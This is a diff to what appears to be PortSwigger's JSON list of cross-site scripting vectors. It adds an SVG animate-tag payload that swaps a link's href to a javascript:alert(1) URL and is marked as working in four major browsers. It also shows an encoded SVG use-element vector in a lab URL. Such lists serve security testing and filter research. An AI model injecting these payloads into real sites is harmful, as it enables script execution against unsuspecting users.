@@ -214,5 +214,15 @@
             "edge"
         ],
         "url": "http://portswigger-labs.net/xss/xss.php?x=%3Csvg%3E%3Cuse%20href%3D%22%2F%2Fsubdomain1.portswigger-labs.net%2Fuse_element%2Fupload.php%23x%22%20%2F%3E%3C%2Fsvg%3E&context=html"
+    },
+    {
+        "description": "Animate tag with keytimes and multiple values",
+        "code": "<svg><animate xlink:href=#xss attributeName=href dur=5s repeatCount=indefinite keytimes=0;0;1 values=\"https://portswigger.net?&semi;javascript:alert(1)&semi;0\" /><a id=xss><text x=20 y=20>XSS</text></a>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ]
     }
 ]
